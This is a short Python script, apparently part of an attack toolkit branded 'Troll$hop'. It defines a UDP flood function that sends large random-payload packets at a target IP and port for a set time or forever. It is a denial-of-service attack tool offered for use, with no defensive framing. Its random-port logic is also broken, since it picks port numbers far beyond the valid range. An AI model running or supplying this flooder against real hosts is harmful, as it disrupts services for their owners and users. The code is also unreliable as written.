import socket
import random
import sys
import time

def UDPFlood(ip, port, duration):
    randport = (True, False)[port == 0]
    clock = (lambda: 0, time.time)[duration > 0]
    end_time = (1, (clock() + duration))[duration > 0]
    print('[Troll$hop] Attacking: %s:%s for %s seconds' % (ip, port, duration or 'infinite'))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(15000)
    while True:
        port = (random.randint(1, 15000000), port)[randport]
        if clock() < end_time:
            sock.sendto(bytes, (ip, port))
        else:
            break
    print('DONE')
